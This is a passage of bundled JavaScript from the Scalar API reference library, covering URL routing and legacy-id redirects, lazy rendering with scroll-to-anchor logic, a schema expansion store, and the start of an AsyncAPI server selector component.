	const remainder = stripBasePathPrefix(decodeURIComponent(url.hash.slice(1)), sanitizeHashBasePath(basePath));
	if (remainder !== null) return applySlugPrefix(remainder, slugPrefix);
	return slugPrefix ?? "";
};
/** Determines whether a URL matches the provided basePath. */
var matchesBasePath = (location, basePath) => {
	const url = typeof location === "string" ? new URL(location) : location;
	if (isHashBasePath(basePath)) {
		const hash = decodeURIComponent(url.hash);
		return hash === basePath || hash.startsWith(`${basePath}/`);
	}
	const basePathWithSlash = encodeBasePath(sanitizeBasePath(basePath));
	return url.pathname === basePathWithSlash || url.pathname.startsWith(`${basePathWithSlash}/`);
};
/**
* Extracts a navigation id from a URL based on the routing type
*
* @param url - The URL to extract the id from
* @param basePath - The base path used in path routing
* @param slugPrefix - If the document slug is not expected in the URL then we must prefix it
*/
var getIdFromUrl = (url, basePath, slugPrefix) => {
	if (typeof basePath !== "string") return getIdFromHash(url, slugPrefix);
	return isHashBasePath(basePath) ? getIdFromHashBasePath(url, basePath, slugPrefix) : getIdFromPath(url, basePath, slugPrefix);
};
/**
* Strips the first segment from an id and preserves trailing slashes
* Used in single-document mode where the document slug is not needed in the URL
*
* @param id - The full id to process
* @returns The id with the first segment removed, preserving trailing slash if present
*/
var stripFirstSegment = (id) => {
	const hasTrailingSlash = id.endsWith("/");
	const result = id.split("/").filter(Boolean).slice(1).join("/");
	return hasTrailingSlash && result ? `${result}/` : result;
};
/**
* Generate a new URL and applies the ID to the path or hash
* depending on the type of routing used
*
* @param id - The id to apply to the URL
* @param basePath - The base path used in path routing
* @param isMultiDocument - Whether the document is multi-document or single-document. Single-document documents will strip the document slug from the id
*/
var makeUrlFromId = (_id, basePath, isMultiDocument) => {
	if (typeof window === "undefined") return;
	/** When there is only 1 document we don't need to include the document name in the URL */
	const id = isMultiDocument ? _id : stripFirstSegment(_id);
	const url = new URL(window.location.href);
	if (typeof basePath === "string") if (isHashBasePath(basePath)) url.hash = [sanitizeHashBasePath(basePath), id].filter(Boolean).join("/");
	else url.pathname = `${sanitizeBasePath(basePath)}/${id}`;
	else url.hash = id;
	return url;
};
/**
* Identifies the host hash prefix against the loaded navigation, before Scalar changes the URL.
* Matching the longest known section suffix handles custom slugs and nested tags without
* mistaking the previous section for part of the host route. Explicit basePath configuration
* remains necessary when a host route is indistinguishable from a Scalar section.
*/
var resolveHashPrefix = (currentHash, navigationIds, isMultiDocument) => {
	const ids = new Set(Array.from(navigationIds, (id) => isMultiDocument ? id : stripFirstSegment(id)).filter(Boolean));
	const { rawId: sectionHash } = getSchemaParamsFromId(currentHash);
	for (let start = 0; start < sectionHash.length; start = sectionHash.indexOf("/", start) + 1) {
		if (ids.has(sectionHash.slice(start))) return start === 0 ? "" : currentHash.slice(0, start - 1);
		if (sectionHash.indexOf("/", start) === -1) break;
	}
	return currentHash;
};
/**
* Builds a crawlable href for a navigation id without reading the current location
*
* Unlike {@link makeUrlFromId} this does not depend on `window`, so it is safe to
* call during server side rendering. That matters because the hrefs must be present
* in the server rendered HTML for search engines to crawl the sidebar navigation.
*
* A scratch URL carries the encoding so the href is spelled the same way as the
* path {@link makeUrlFromId} pushes to history — otherwise the same section would
* exist under two URL spellings (the crawled one and the clicked one). The href is
* relative, so unlike the pushed URL it does not carry the current query string,
* and a degenerate id that would resolve off site is normalized (see below).
*
* @param id - The id to build the href for
* @param basePath - The base path used in path routing
* @param isMultiDocument - Whether the document is multi-document or single-document. Single-document documents will strip the document slug from the id
*/
var makeHrefFromId = (_id, basePath, isMultiDocument) => {
	/** When there is only 1 document we don't need to include the document name in the URL */
	const id = isMultiDocument ? _id : stripFirstSegment(_id);
	const url = new URL("http://scratch");
	if (typeof basePath === "string") {
		if (isHashBasePath(basePath)) {
			url.hash = [sanitizeHashBasePath(basePath), id].filter(Boolean).join("/");
			return url.hash || "#";
		}
		url.pathname = `${sanitizeBasePath(basePath)}/${id}`;
		return url.pathname.replace(/^\/+/, "/");
	}
	url.hash = id;
	return url.hash || "#";
};
var escapeRegex = (value) => value.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
/** Carrier for an id that lives in the bare hash fragment (`#<id>`). */
var bareHashCarrier = (url) => ({
	value: decodeURIComponent(url.hash.slice(1)),
	write: (next) => {
		url.hash = next;
	}
});
/**
* Locates the navigation id inside a URL regardless of the routing mode.
*
* The id can live in three places — the bare hash, a hash base path (`#<base>/<id>`), or the
* pathname after a path base path. Each carrier pairs the decoded id with a `write` callback, so
* callers edit ids in id-space without re-deriving the routing chrome for each mode.
*
* Multiple carriers are returned: the canonical location for the active routing mode comes first,
* followed by a legacy bare-hash carrier. Both path and hash-base-path routing include the bare hash
* so a stale `#default/model/User` bookmark (left over from before the base path was configured) is
* still canonicalized — the previous implementation rewrote such doc-slug-anchored hashes on every
* load regardless of the routing mode. Callers rewrite every carrier that matches, not just the
* first, so a legacy id sitting in both the pathname and the hash is cleaned up in one pass.
*/
var locateIdCarriers = (url, basePath) => {
	if (typeof basePath !== "string") return [bareHashCarrier(url)];
	if (isHashBasePath(basePath)) {
		const base = sanitizeHashBasePath(basePath);
		return [{
			value: stripBasePathPrefix(decodeURIComponent(url.hash.slice(1)), base) ?? "",
			write: (next) => {
				url.hash = [base, next].filter(Boolean).join("/");
			}
		}, bareHashCarrier(url)];
	}
	const base = sanitizeBasePath(basePath);
	const remainder = stripBasePathPrefix(url.pathname, encodeBasePath(base));
	return [{
		value: remainder === null ? "" : decodeURIComponent(remainder),
		write: (next) => {
			url.pathname = base ? `/${base}/${next}` : `/${next}`;
		}
	}, bareHashCarrier(url)];
};
/**
* Applies redirect rules to an id and returns the first rewrite that changes it.
*
* Rules are tried in order and the search stops at the first match, so list more specific rules
* before more general ones. Returns the id unchanged when no rule applies.
*/
var applyIdRedirects = (id, redirects) => {
	for (const { match, replace } of redirects) {
		const next = typeof replace === "string" ? id.replace(match, replace) : id.replace(match, replace);
		if (next !== id) return next;
	}
	return id;
};
/** Optional `(tag-group/<n>/)?tag/<slug>/` chrome that may sit in front of a section segment. */
var TAG_CHROME = "(?:(?:tag-group/[^/]+/)?tag/[^/]+/)?";
/**
* Builds the list of id redirects for the current document.
*
* Add an entry here to support a new redirect. Each rule runs against every URL shape (hash, hash
* base path, path) for free, because rules operate on routing-agnostic ids.
*/
var buildRedirects = ({ modelsSectionSlug, documentSlug, isMultiDocument }) => {
	const escapedDoc = escapeRegex(documentSlug);
	const documentPrefix = isMultiDocument ? `${escapedDoc}/${TAG_CHROME}` : `(?:${escapedDoc}/${TAG_CHROME})?`;
	const renameSectionSegment = (from) => ({
		match: new RegExp(`^(${documentPrefix})${escapeRegex(from)}/`),
		replace: (_match, prefix) => `${prefix}${modelsSectionSlug}/`
	});
	const redirects = [renameSectionSegment("model")];
	if (modelsSectionSlug !== "models") redirects.push(renameSectionSegment("models"));
	return redirects;
};
/**
* Markers that separate an operation id from a schema path within an anchor id.
* `responses` mirrors the request-body/parameter markers so response property
* anchors (e.g. `operation.responses.200.name`) resolve back to the operation id.
* Without it, deep links into responses cannot find their operation.
*/
var SCHEMA_PARAM_MARKERS = [
	".body.",
	".path.",
	".query.",
	".header.",
	".responses."
];
/**
* Builds redirect rules mapping each webhook's legacy dot-dropped slug to its current slug.
*
* Webhook ids used to slugify the event name with no options, which dropped dots
* (`account_holder.created` -> `account-holdercreated`); the current id keeps them
* (`account-holder.created`). That rewrite cannot be reversed generically, so we emit one exact rule
* per webhook whose legacy slug differs from the current one. Each rule matches the invariant
* `webhook/<METHOD>/<legacy-slug>` tail, so it applies regardless of the document/tag prefix in front
* of it and preserves any sub-anchor after it. A sub-anchor is either a `/` segment or a dot-joined
* schema property anchor (e.g. `.body.id`, see {@link SCHEMA_PARAM_MARKERS}); a dot followed by
* anything else is not treated as a boundary, because the legacy slug never contains a dot while a
* current webhook slug can, so such a URL belongs to a different webhook.
*
* Because the legacy slug is lossy, two things can make a redirect unsafe, and both are dropped so an
* ambiguous link falls through to normal not-found handling instead of landing on the wrong webhook:
* - the legacy slug is already another webhook's *current* slug (redirecting it would hijack a valid
*   URL), or
* - two webhooks collapse to the same legacy slug (the old bookmark is genuinely ambiguous).
*/
var buildWebhookRedirects = (webhooks) => {
	const legacyWebhooks = webhooks.filter(({ id }) => !id.includes("/webhook/additionalOperations/"));
	const key = (method, slug) => `${isHttpMethod(method) ? method.toUpperCase() : method}/${slug}`;
	const currentKeys = /* @__PURE__ */ new Set();
	const legacyCounts = /* @__PURE__ */ new Map();
	for (const { name, method, id } of legacyWebhooks) {
		currentKeys.add(key(method, id.slice(id.lastIndexOf("/") + 1)));
		const legacySlug = slugify(name);
		if (legacySlug) {
			const legacyKey = key(method, legacySlug);
			legacyCounts.set(legacyKey, (legacyCounts.get(legacyKey) ?? 0) + 1);
		}
	}
	const boundary = `(?=$|/|${SCHEMA_PARAM_MARKERS.map(escapeRegex).join("|")})`;
	const redirects = [];
	for (const { name, method, id } of legacyWebhooks) {
		const upperMethod = isHttpMethod(method) ? method.toUpperCase() : method;
		const currentSlug = id.slice(id.lastIndexOf("/") + 1);
		const legacySlug = slugify(name);
		const legacyKey = key(method, legacySlug);
		if (!legacySlug || legacySlug === currentSlug || currentKeys.has(legacyKey) || (legacyCounts.get(legacyKey) ?? 0) > 1) continue;
		redirects.push({
			match: new RegExp(`(^|/)webhook/${escapeRegex(upperMethod)}/${escapeRegex(legacySlug)}${boundary}`),
			replace: (_match, prefix) => `${prefix}webhook/${upperMethod}/${currentSlug}`
		});
	}
	return redirects;
};
/**
* Rewrites navigation ids in a URL to their current form.
*
* The URL is reduced to its routing-agnostic id (see {@link locateIdCarriers}), each redirect rule
* is applied in id-space (see {@link buildRedirects} for models and {@link buildWebhookRedirects} for
* webhooks), and the result is spliced back into the original location. This handles hash,
* hash-base-path, and path routing uniformly, so a new redirect only has to be added to the list once.
*
* Returns the canonicalized URL when a rewrite happens, or null otherwise.
*/
var redirectUrl = (url, modelsSectionSlug, documentSlug, isMultiDocument, basePath, webhooks = []) => {
	if (!documentSlug) return null;
	const target = new URL(typeof url === "string" ? url : url.toString());
	const redirects = [...buildRedirects({
		modelsSectionSlug,
		documentSlug,
		isMultiDocument
	}), ...buildWebhookRedirects(webhooks)];
	let didRedirect = false;
	for (const carrier of locateIdCarriers(target, basePath)) {
		const rewritten = applyIdRedirects(carrier.value, redirects);
		if (rewritten !== carrier.value) {
			carrier.write(rewritten);
			didRedirect = true;
		}
	}
	return didRedirect ? target : null;
};
/** Extracts the schema parameters from the id if they are present */
var getSchemaParamsFromId = (id) => {
	let markerIndex = -1;
	for (const marker of SCHEMA_PARAM_MARKERS) {
		const index = id.indexOf(marker);
		if (index !== -1 && (markerIndex === -1 || index < markerIndex)) markerIndex = index;
	}
	if (markerIndex === -1) return {
		rawId: id,
		params: ""
	};
	return {
		rawId: id.slice(0, markerIndex),
		params: id.slice(markerIndex + 1)
	};
};
//#endregion
//#region node_modules/@scalar/api-reference/dist/helpers/lazy-bus.js
/**
* List of items that are in the priority queue and will be rendered first (e.g. scroll target).
*/
var priorityQueue = reactive(/* @__PURE__ */ new Set());
/** List of items that are pending to be loaded (in viewport overscan). */
var pendingQueue = reactive(/* @__PURE__ */ new Set());
/** List of items that are already loaded and stay mounted (no eviction). */
var readyQueue = reactive(/* @__PURE__ */ new Set());
/**
* Flag to indicate if the lazy bus is currently running
* Blocks ID changes while running
*/
var isRunning = ref(false);
/** How long tryScroll keeps retrying to find the element (ms). */
var SCROLL_RETRY_MS = 3e3;
/** Tracks when the initial load is complete. */
var firstLazyLoadComplete = ref(false);
/**
* The id of the element we are currently scrolling to (the anchor target).
*
* Schema properties live inside collapsible disclosures that are not part of the
* navigation tree, so the lazy bus cannot expand them the way it expands sidebar
* parents. Instead we publish the active target here and let each collapsible
* schema disclosure open itself when its breadcrumb is on the path to the target.
* This is what makes deep links to hidden (collapsed) schema properties work.
*/
var scrollTargetId = ref("");
/**
* Whether the live scroll target is `path` itself or something inside it.
*
* Shared rather than re-spelled per surface, because every caller has to agree
* on the same rule: a literal `.` separates segments, and the prefix must end
* on a segment boundary or `user` would claim a deep link to `username`.
* Returns false for an empty path, so a node with no breadcrumb never matches.
*/
var isOnScrollTargetPath = (path) => {
	const target = scrollTargetId.value;
	if (!path || !target) return false;
	return target === path || target.startsWith(`${path}.`);
};
/**
* Clears the scroll target once we are done with it, so a stale target cannot
* re-open a disclosure the user later collapsed (or that remounts). Guarded by
* the id so a newer navigation that started during the scroll retry is kept.
*/
var clearScrollTarget = (id) => {
	if (scrollTargetId.value === id) scrollTargetId.value = "";
};
/** List of unique identifiers that are blocking intersection */
var intersectionBlockers = reactive(/* @__PURE__ */ new Set());
var onRenderComplete = /* @__PURE__ */ new Set();
/** Cached content heights so placeholders can match when not rendered. */
var lazyPlaceholderHeights = reactive(/* @__PURE__ */ new Map());
var getLazyPlaceholderHeight = (id) => lazyPlaceholderHeights.get(id);
var setLazyPlaceholderHeight = (id, height) => {
	if (!Number.isFinite(height) || height <= 0) return;
	lazyPlaceholderHeights.set(id, Math.round(height));
};
/** Adds a one time callback to be executed when the lazy bus has finished loading */
var addLazyCompleteCallback = (callback) => {
	if (callback) onRenderComplete.add(callback);
};
/**
* Blocks intersection until the returned unblock callback is run.
* Prevents scroll jump while we render new lazy content.
*/
var blockIntersection = () => {
	const blockId = nanoid();
	intersectionBlockers.add(blockId);
	/** Unblock uses a small delay to ensure the scroll is complete before enabling intersection */
	return () => setTimeout(() => intersectionBlockers.delete(blockId), 100);
};
/** If there are any pending blocking operations we disable intersection */
var intersectionEnabled = computed(() => intersectionBlockers.size === 0);
/**
* Processes the full queue: priority first, then pending. Blocks intersection while
* rendering so the viewport does not jump. No eviction — items stay in readyQueue.
*/
var runLazyBus = () => {
	if (typeof window === "undefined") return;
	if (isRunning.value) return;
	isRunning.value = true;
	/**
	* Sets all the pending elements into the ready queue
	* After waiting for Vue to update the DOM we execute the callbacks and unblock intersection
	*/
	const processQueue = async () => {
		const priorityIds = [...priorityQueue];
		const pendingIds = [...pendingQueue];
		if (priorityIds.length === 0 && pendingIds.length === 0) {
			onRenderComplete.forEach((fn) => fn());
			onRenderComplete.clear();
			isRunning.value = false;
			firstLazyLoadComplete.value = true;
			return;
		}
		for (const id of priorityIds) {
			readyQueue.add(id);
			priorityQueue.delete(id);
		}
		for (const id of pendingIds) {
			readyQueue.add(id);
			pendingQueue.delete(id);
		}
		await nextTick();
		onRenderComplete.forEach((fn) => fn());
		onRenderComplete.clear();
		isRunning.value = false;
		firstLazyLoadComplete.value = true;
	};
	if (window.requestIdleCallback) window.requestIdleCallback(processQueue, { timeout: 1500 });
	else nextTick(processQueue);
};
/**
* Run the lazy bus when the queue changes and is not currently running
* Debounce so that multiple changes to the queue are batched together
*
* We must run when the priority queue changes because we rely on finish callbacks
* anytime we request potentially lazy elements. If we don't run when the priority queue changes
* we may not have a finish callback even though the element is set to load.
*/
watchDebounced([
	() => pendingQueue.size,
	() => priorityQueue.size,
	() => isRunning.value
], () => {
	if ((pendingQueue.size > 0 || priorityQueue.size > 0) && !isRunning.value) runLazyBus();
}, {
	debounce: 300,
	maxWait: 1500
});
/**
* We only make elements pending if they are not already in the priority or ready queue
*/
var addToPendingQueue = (id) => {
	if (id && !readyQueue.has(id) && !priorityQueue.has(id)) pendingQueue.add(id);
};
/**
* Add elements to the priority queue for immediate rendering.
* We allow adding items already in readyQueue so that callbacks are still triggered,
* but processQueue will skip actual re-rendering for items already ready.
*/
var addToPriorityQueue = (id) => {
	if (id && !priorityQueue.has(id)) priorityQueue.add(id);
};
/**
* Request an item to be rendered (e.g. when it re-enters the overscan zone).
*/
var requestLazyRender = (id, priority = false) => {
	if (!id || readyQueue.has(id)) return;
	if (priority) addToPriorityQueue(id);
	else addToPendingQueue(id);
	if (!isRunning.value) runLazyBus();
};
/**
* Schedules a single run of the lazy bus so that documents with no Lazy components
* (e.g. no operations, tags, or models) still get firstLazyLoadComplete set and the
* full-viewport placeholder can be hidden. Call from content root on mount.
*/
var scheduleInitialLoadComplete = () => {
	if (typeof window === "undefined") return;
	window.setTimeout(() => runLazyBus(), 400);
};
/** When an element is unmounted we remove it from all queues */
var resetLazyElement = (id) => {
	priorityQueue.delete(id);
	pendingQueue.delete(id);
	readyQueue.delete(id);
	lazyPlaceholderHeights.delete(id);
};
/**
* Tracks the lazy loading state of an element.
* Use isReady (or expanded) to decide whether to render the slot or show a placeholder.
* The element is only added to the queue when it enters the viewport overscan (see Lazy.vue).
*/
function useLazyBus(id) {
	onBeforeUnmount(() => {
		resetLazyElement(id);
	});
	return { isReady: computed(() => typeof window === "undefined" || priorityQueue.has(id) || readyQueue.has(id)) };
}
/**
* Scroll to a possibly lazy-loaded element. Expands parents and adds target (and
* parents) to the priority queue, then scrolls after Vue has flushed.
*
* The id is used exactly as given: legacy anchors (`…responses.headers.headers.X`)
* are deliberately never rewritten, because a rewrite can corrupt a valid anchor,
* and an unresolvable id already falls back to scrolling its operation instead
* (see tryScroll's fallbackId).
*/
var scrollToLazy = (id, setExpanded, getEntryById) => {
	const item = getEntryById(id);
	const unfreeze = !readyQueue.has(id) || item?.children?.some((child) => !readyQueue.has(child.id)) ? freeze(id) : void 0;
	addLazyCompleteCallback(unfreeze);
	const unblock = blockIntersection();
	const { rawId } = resolveNavigationId(id, getEntryById);
	scrollTargetId.value = id;
	addToPriorityQueue(id);
	addToPriorityQueue(rawId);
	if (item?.children) item.children.slice(0, 2).forEach((child) => addToPriorityQueue(child.id));
	if (item?.parent) {
		const parent = getEntryById(item.parent.id);
		const elementIdx = parent?.children?.findIndex((child) => child.id === id);
		if (elementIdx !== void 0 && elementIdx >= 0) parent?.children?.slice(elementIdx, elementIdx + 2).forEach((child) => addToPriorityQueue(child.id));
	}
	setExpanded(rawId, true);
	/**
	* Recursively expand the parents and set them as a loading priority
	* This ensures all parents will be immediately loaded and open
	*/
	const addParents = (currentId) => {
		const parent = getEntryById(currentId)?.parent;
		if (parent) {
			addToPriorityQueue(parent.id);
			setExpanded(parent.id, true);
			addParents(parent.id);
		}
	};
	/** Must use the rawId as schema params are not in the navigation tree */
	addParents(rawId);
	nextTick(() => {
		tryScroll(id, Date.now() + SCROLL_RETRY_MS, unblock, unfreeze, rawId);
	});
};
/**
* Find the navigation entry a schema-property anchor belongs to.
*
* `getSchemaParamsFromId` splits on operation markers (`.body.`, `.responses.`),
* so it lands on the operation for a plain property anchor. Three shapes need
* more than that split, and all three are handled by trimming dot segments from
* the right until the navigation tree recognises one:
*
* - model and AsyncAPI message anchors (`…/models/Planet.name`) carry no marker
*   at all, so the split returns the whole id
* - a callback anchor continues past the marker
*   (`…/post.callbacks.<name>.<url>.<method>.responses.200.id`), so the split
*   stops at a segment that is not a navigation entry
* - a callback url expression can hold a marker of its own
*   (`{$request.query.q}`), so the split can stop mid-expression
*
* Trying the full id first keeps a model whose own name contains a dot
* resolving, and the untrimmed `rawId` stays the fallback when nothing matches.
*/
var resolveNavigationId = (id, getEntryById) => {
	const { rawId } = getSchemaParamsFromId(id);
	if (getEntryById(rawId)) return { rawId };
	let candidate = rawId;
	while (true) {
		const lastDot = candidate.lastIndexOf(".");
		if (lastDot === -1) return { rawId };
		candidate = candidate.slice(0, lastDot);
		if (getEntryById(candidate)) return { rawId: candidate };
	}
};
/**
* Measures registered headers covering the target at its scrollport's top.
* Headers opt in with `data-scalar-scroll-header`; unrelated fixed elements are never measured.
* Horizontal overlap excludes sidebars; sorting also handles stacked navigation bars.
*/
var getStickyHeaderOffset = (element, scrollportTop = 0) => {
	const target = element.getBoundingClientRect();
	const targetX = target.left + target.width / 2;
	const headers = Array.from(element.ownerDocument.querySelectorAll("[data-scalar-scroll-header]")).flatMap((candidate) => {
		if (candidate === element || candidate.contains(element) || element.contains(candidate)) return [];
		const rect = candidate.getBoundingClientRect();
		if (rect.height <= 0 || rect.bottom <= scrollportTop || rect.left > targetX || rect.right <= targetX) return [];
		const style = window.getComputedStyle(candidate);
		return (style.position === "sticky" || style.position === "fixed") && style.visibility !== "hidden" ? [rect] : [];
	}).sort((a, b) => a.top - b.top);
	if (headers.length === 0) return 0;
	const margin = Number.parseFloat(window.getComputedStyle(element).scrollMarginTop) || 0;
	let bottom = scrollportTop + Math.max(0, margin);
	for (const header of headers) {
		if (header.top > bottom + 1) break;
		bottom = Math.max(bottom, header.bottom);
	}
	return bottom - scrollportTop;
};
/** Scrolls nested containers natively before compensating for overlapping headers. */
var scrollToElement = (element) => {
	element.scrollIntoView({
		block: "start",
		behavior: "instant"
	});
	let scrollportTop = 0;
	for (let parent = element.parentElement; parent; parent = parent.parentElement) {
		const { overflowY } = window.getComputedStyle(parent);
		if (/(auto|scroll|hidden)/.test(overflowY) && parent.scrollHeight > parent.clientHeight) {
			scrollportTop = Math.max(0, parent.getBoundingClientRect().top + parent.clientTop);
			break;
		}
	}
	const offset = getStickyHeaderOffset(element, scrollportTop);
	if (offset <= (Number.parseFloat(window.getComputedStyle(element).scrollMarginTop) || 0)) return;
	const previous = element.style.getPropertyValue("scroll-margin-top");
	const priority = element.style.getPropertyPriority("scroll-margin-top");
	element.style.setProperty("scroll-margin-top", `${offset}px`, "important");
	element.scrollIntoView({
		block: "start",
		behavior: "instant"
	});
	if (previous) element.style.setProperty("scroll-margin-top", previous, priority);
	else element.style.removeProperty("scroll-margin-top");
};
/**
* Tiny wrapper around the scrollIntoView API
* Retries up to the stopTime in case the element is not yet rendered
*
* @param id - The id of the element to scroll to
* @param stopTime - The time to stop retrying in unix milliseconds
*/
var tryScroll = (id, stopTime, onComplete, onFailure, fallbackId) => {
	const element = document.getElementById(id);
	if (element) {
		scrollToElement(element);
		if (element instanceof HTMLElement && scrollTargetId.value === id) element.focus({ preventScroll: true });
		clearScrollTarget(id);
		onComplete();
	} else if (Date.now() < stopTime) requestAnimationFrame(() => tryScroll(id, stopTime, onComplete, onFailure, fallbackId));
	else {
		if (fallbackId && fallbackId !== id && scrollTargetId.value === id) {
			const fallback = document.getElementById(fallbackId);
			if (fallback) scrollToElement(fallback);
		}
		clearScrollTarget(id);
		onComplete();
		onFailure?.();
	}
};
var freeze = (id) => {
	let stop = false;
	const runFrame = (stopAfterFrame) => {
		const element = document.getElementById(id);
		if (element) scrollToElement(element);
		if (!stopAfterFrame) requestAnimationFrame(() => runFrame(stop));
	};
	runFrame(false);
	return () => {
		stop = true;
	};
};
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/Schema/helpers/schema-expansion.js
/**
* Whether `key` is `root` or sits beneath it. A literal `.` is the separator
* even though property names may contain one (`a.b` + `c` collides with `a` +
* `b.c`); the key is deliberately the same string as the public anchor used by
* the sidebar, `scrollTargetId` and shared URLs, so it cannot be re-encoded alone.
*/
var isUnder = (key, root) => root === "" || key === root || key.startsWith(`${root}.`);
/**
* Build the node key for a breadcrumb: the dot-joined anchor path, so store keys
* and public anchors are the same string. Callers append `~`-marked structural
* segments (`~headers`, `~anonymous-…`) for nodes the anchor cannot name.
*/
var toNodeKey = (breadcrumb) => breadcrumb?.join(".") ?? "";
/**
* How many closed panels one store keeps mounted as `hidden="until-found"` —
* one `<ApiReference>`, not one tree, since every tree under it shares a store.
*/
var UNTIL_FOUND_CAP = 300;
/**
* A per-reference store of which schema properties are open. Sparse by
* construction: only what somebody touched, typically under twenty keys, where
* a dense map over a large document would be tens of thousands. The maps are
* `shallowReactive` because a Map inside a `shallowRef` does not track `.set()`
* (clicks would do nothing) and replacing the Map wholesale would invalidate
* every mounted row on every toggle.
*/
var createSchemaExpansionStore = () => {
	/** Only what the user explicitly opened or closed. */
	const overrides = shallowReactive(/* @__PURE__ */ new Map());
	/** Per-subtree expand-all / collapse-all roots. */
	const bulkRoots = shallowReactive(/* @__PURE__ */ new Map());
	const baseline = shallowRef("default");
	/** The nearest bulk root at or above `key`, if any. */
	const nearestBulkRoot = (key) => {
		if (bulkRoots.size === 0) return;
		let candidate = key;
		while (true) {
			const value = bulkRoots.get(candidate);
			if (value !== void 0) return value;
			const cut = candidate.lastIndexOf(".");
			if (cut === -1) return bulkRoots.get("");
			candidate = candidate.slice(0, cut);
		}
	};
	/**
	* Newest intent wins: a bulk write drops the overrides beneath its root, so
	* "an explicit override always wins" never becomes "Expand all silently skips
	* every node the user has ever touched". O(overrides), which stays small.
	*/
	const clearOverridesUnder = (root) => {
		for (const key of [...overrides.keys()]) if (isUnder(key, root)) overrides.delete(key);
	};
	/** While true, closing rows must not take until-found slots. */
	let retentionPaused = false;
	const pauseRetentionFor = (mutate) => {
		retentionPaused = true;
		mutate();
		nextTick(() => {
			retentionPaused = false;
		});
	};
	const setBulk = (root, value) => {
		clearOverridesUnder(root);
		if (root === "") {
			bulkRoots.clear();
			baseline.value = value ? "expanded" : "collapsed";
			return;
		}
		for (const existing of [...bulkRoots.keys()]) if (isUnder(existing, root)) bulkRoots.delete(existing);
		bulkRoots.set(root, value);
	};
	const isExpanded = (key, ctx = {}) => {
		const override = overrides.get(key);
		if (override !== void 0) return override;
		if (!ctx.cyclic) {
			const bulk = nearestBulkRoot(key);
			if (bulk !== void 0) return bulk;
			if (baseline.value === "expanded") return true;
			if (baseline.value === "collapsed") return false;
		}
		if (isOnScrollTargetPath(ctx.anchorPath ?? key)) return true;
		return ctx.defaultOpen ?? false;
	};
	const setExpanded = (key, value) => {
		overrides.set(key, value);
	};
	return {
		isExpanded,
		setExpanded,
		toggle: (key, ctx) => setExpanded(key, !isExpanded(key, ctx)),
		expandAll: (root = "") => setBulk(root, true),
		collapseAll: (root = "") => pauseRetentionFor(() => setBulk(root, false)),
		commitPath: (path) => {
			if (!path) return;
			const segments = path.split(".");
			for (let index = 1; index <= segments.length; index++) {
				const prefix = segments.slice(0, index).join(".");
				overrides.set(prefix, true);
				const cut = prefix.lastIndexOf(".");
				if (cut !== -1) overrides.set(`${prefix.slice(0, cut)}.~${prefix.slice(cut + 1)}`, true);
			}
		},
		baseline,
		pauseRetentionFor,
		untilFound: (() => {
			let used = 0;
			return {
				acquire: () => {
					if (retentionPaused || used >= UNTIL_FOUND_CAP) return false;
					used += 1;
					return true;
				},
				release: () => {
					used = Math.max(0, used - 1);
				}
			};
		})()
	};
};
/**
* Carries the expansion store down to every row of one schema tree. The store
* is provided rather than kept in module scope so two `<ApiReference>` roots on
* the same page each get their own expansion state, and so a Schema mounted on
* its own (a test or a story) can fall back to providing one for its subtree.
*/
var SCHEMA_EXPANSION_SYMBOL = Symbol("schema-expansion");
/**
* Marks that an enclosing Schema already owns the tree root. Nesting depth
* cannot identify the outermost tree, because a nested Schema may mount at depth
* 0 (an `allOf` member, or a caller that omits `depth`), and the root-only
* features (sticky ancestor strip, keyboard navigation) must not install twice.
*/
var SCHEMA_TREE_ROOT_SYMBOL = Symbol("schema-tree-root");
/**
* Create the expansion store for one `<ApiReference>` and wire up deep links.
* The scroll target is read only after mount: it comes from a URL fragment the
* server never sees, so committing it during SSR would make every ancestor
* panel on a deep-linked path a hydration mismatch.
*/
var provideSchemaExpansion = () => {
	const store = createSchemaExpansionStore();
	provide(SCHEMA_EXPANSION_SYMBOL, store);
	onMounted(() => {
		watch(scrollTargetId, (target) => {
			if (target) store.commitPath(target);
		}, { immediate: true });
		/** Print with everything expanded, then put the reader's state back. */
		let baselineBeforePrint = null;
		const handleBeforePrint = () => {
			baselineBeforePrint = store.baseline.value;
			store.baseline.value = "expanded";
		};
		const handleAfterPrint = () => {
			if (baselineBeforePrint !== null) {
				const previous = baselineBeforePrint;
				store.pauseRetentionFor(() => {
					store.baseline.value = previous;
				});
				baselineBeforePrint = null;
			}
		};
		window.addEventListener("beforeprint", handleBeforePrint);
		window.addEventListener("afterprint", handleAfterPrint);
		onBeforeUnmount(() => {
			window.removeEventListener("beforeprint", handleBeforePrint);
			window.removeEventListener("afterprint", handleAfterPrint);
		});
	});
	return store;
};
/**
* Get the expansion store for this schema tree. One store per `<ApiReference>`,
* never module-global: `createApiReference` can run twice on one page and the
* two must not share expansion. When nothing above has provided one (a Schema
* mounted alone in a test or story), the first node to ask creates and provides
* it, so its descendants still share one.
*/
var useSchemaExpansion = () => {
	const provided = inject(SCHEMA_EXPANSION_SYMBOL, null);
	if (provided) return provided;
	const fallback = createSchemaExpansionStore();
	provide(SCHEMA_EXPANSION_SYMBOL, fallback);
	return fallback;
};
//#endregion
//#region node_modules/@scalar/api-reference/dist/blocks/scalar-asyncapi-server-selector-block/components/Selector.vue.script.js
var _hoisted_1$97 = { class: "sr-only" };
var _hoisted_2$60 = { class: "overflow-x-auto" };
var _hoisted_3$42 = {
	key: 1,
	class: "text-c-1 flex h-auto w-full items-center gap-0.75 !rounded-b-xl px-3 py-1.5 text-base leading-[20px] whitespace-nowrap"
};
var _hoisted_4$27 = { class: "sr-only" };
var _hoisted_5$18 = { class: "overflow-x-auto" };
//#endregion
//#region node_modules/@scalar/api-reference/dist/blocks/scalar-asyncapi-server-selector-block/components/Selector.vue.js
var Selector_default$1 = /* @__PURE__ */ defineComponent({
	__name: "Selector",
	props: {
		selectedServer: {},
		servers: {},
		target: {}
	},
	emits: ["update:modelValue"],
	setup(__props, { expose: __expose, emit: __emit }) {
		const emit = __emit;
		const { translate } = useLocalization();
		/**
		* AsyncAPI servers are a named map without a single `url`, so we key options by
		* the server name and label them with the constructed connection URL.
		*/
		const serverOptions = computed(() => __props.servers.map((server) => ({
			id: server.name,
			label: server.url
		})));
		const serverUrlWithoutTrailingSlash = computed(() => __props.selectedServer?.url?.replace(/\/$/, "") || "");
		const selectedServerOption = computed(() => serverOptions.value.find((opt) => opt.id === __props.selectedServer?.name));
		__expose({
			servers: __props.servers,
			serverUrlWithoutTrailingSlash,
			serverOptions,
			selectedServer: __props.selectedServer
		});
		return (_ctx, _cache) => {
